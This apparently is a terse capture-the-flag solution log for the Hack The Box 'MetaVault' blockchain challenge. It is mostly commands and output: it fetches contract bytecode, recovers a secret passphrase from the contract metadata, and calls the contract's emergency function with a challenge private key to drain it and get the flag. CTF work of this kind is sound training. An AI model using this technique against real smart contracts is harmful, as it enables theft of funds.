#Solidity Source Code, Metadata

#https://medium.com/@DeepakDSG/htb-metavault-5588c1482c7b
#https://github.com/hackthebox/business-ctf-2024/tree/main/blockchain/MetaVault%20%5BEasy%5D

'''
nc 94.237.59.173 52935
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 1

Private key     :  0x6d591949c5a97894f3a1a016ae4187a1cfc744a1e451e8beaa16825a34485f24
Address         :  0xd3fCbEE4B16f09eB4A0b828643e78a2fAc065005
Target contract :  0x5e9b0921A3c1331286718AeBFb19dcF828B3e4cd
Setup contract  :  0x05C319039c9FC235cc3908A2b889aD2b34BB5bFc


cast code 0x5e9b0921A3c1331286718AeBFb19dcF828B3e4cd --rpc-url http://94.237.59.173:52063
0x608060405260043610610033575f3560e01c80637717ef0a14610037578063d0e30db01461005f578063ed12e8ef14610069575b5f80fd5b348015610042575f80fd5b5061005d6004803603810190610058919061033a565b610093565b005b610067610198565b005b348015610074575f80fd5b5061007d6101e6565b60405161008a9190610399565b60405180910390f35b5f818051906020012090507f42c10591ced4987005f70d29b498348ecc8ab18dd28c5b93db931375ca826b5e5f1b810361013a573373ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8627c6a54714854ffe0d86de4bd07433571e38ef8278eec77537e813e6e2aefb60405160405180910390a33373ffffffffffffffffffffffffffffffffffffffff16ff5b80826040516101499190610404565b60405180910390203373ffffffffffffffffffffffffffffffffffffffff167fd90862e8c1ff9ac860fd78400932981842d03ac41178a7287137aa02d3dce19460405160405180910390a45050565b6101a06101e6565b343373ffffffffffffffffffffffffffffffffffffffff167f90890809c654f11d6e72a28fa60149770a0d11ec6c92319d6ceb2bb0a4ea1a1560405160405180910390a4565b5f47905090565b5f604051905090565b5f80fd5b5f80fd5b5f80fd5b5f80fd5b5f601f19601f8301169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b61024c82610206565b810181811067ffffffffffffffff8211171561026b5761026a610216565b5b80604052505050565b5f61027d6101ed565b90506102898282610243565b919050565b5f67ffffffffffffffff8211156102a8576102a7610216565b5b6102b182610206565b9050602081019050919050565b828183375f83830152505050565b5f6102de6102d98461028e565b610274565b9050828152602081018484840111156102fa576102f9610202565b5b6103058482856102be565b509392505050565b5f82601f830112610321576103206101fe565b5b81356103318482602086016102cc565b91505092915050565b5f6020828403121561034f5761034e6101f6565b5b5f82013567ffffffffffffffff81111561036c5761036b6101fa565b5b6103788482850161030d565b91505092915050565b5f819050919050565b61039381610381565b82525050565b5f6020820190506103ac5f83018461038a565b92915050565b5f81519050919050565b5f81905092915050565b8281835e5f83830152505050565b5f6103de826103b2565b6103e881856103bc565b93506103f88185602086016103c6565b80840191505092915050565b5f61040f82846103d4565b91508190509291505056fea264697066735822122082d2cd9bbb87fa23ea5240743cee1a27affc0b699174f7e1d2d2812fe1874e7b64736f6c63430008190033


Decode in https://playground.sourcify.dev/

WeLoveNukaCola!!MoD-2024

cast send 0x5e9b0921A3c1331286718AeBFb19dcF828B3e4cd 'emergency(string)' 'WeLoveNukaCola!!MoD-2024' --rpc-url http://94.237.59.173:52063 --private-key 0x6d591949c5a97894f3a1a016ae4187a1cfc744a1e451e8beaa16825a34485f24

blockHash               0x6893368bb7230e3d069b498bb4f95c2c97fb5446c29875922c7b1f2115e6802b
blockNumber             2
contractAddress
cumulativeGasUsed       29299
effectiveGasPrice       1
from                    0xd3fCbEE4B16f09eB4A0b828643e78a2fAc065005
gasUsed                 29299
logs                    [{"address":"0x5e9b0921a3c1331286718aebfb19dcf828b3e4cd","topics":["0x8627c6a54714854ffe0d86de4bd07433571e38ef8278eec77537e813e6e2aefb","0x000000000000000000000000d3fcbee4b16f09eb4a0b828643e78a2fac065005","0x000000000000000000000000d3fcbee4b16f09eb4a0b828643e78a2fac065005"],"data":"0x","blockHash":"0x6893368bb7230e3d069b498bb4f95c2c97fb5446c29875922c7b1f2115e6802b","blockNumber":"0x2","blockTimestamp":"0x6767ab38","transactionHash":"0xd5ff211daf9041cb1e33f427c3b14c535550c6e9e66f84133fc14399065619a0","transactionIndex":"0x0","logIndex":"0x0","removed":false}]
logsBloom               0x00000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000010000000000000000000000002000000000000000000000000000000000000000020000000000000000000000000000000000100000000000000000000000040000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000
root
status                  1 (success)
transactionHash         0xd5ff211daf9041cb1e33f427c3b14c535550c6e9e66f84133fc14399065619a0
transactionIndex        0
type                    2
blobGasPrice            1
blobGasUsed
authorizationList
to                      0x5e9b0921A3c1331286718AeBFb19dcF828B3e4cd
root             "0xfd1e11166b42f1662f87e05b8f9df25dd81ecec3441e00c5b5953006fe0d47f5"

root@ubuntu-s-1vcpu-1gb-lon1-01:~/ctf/htb/ctf/blockchain/blockchain_metavault# nc 94.237.59.173 52935
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 3
HTB{wh0_tf_sh4r3s_s3cr3ts_1n_th3_c0mm3nts}

'''
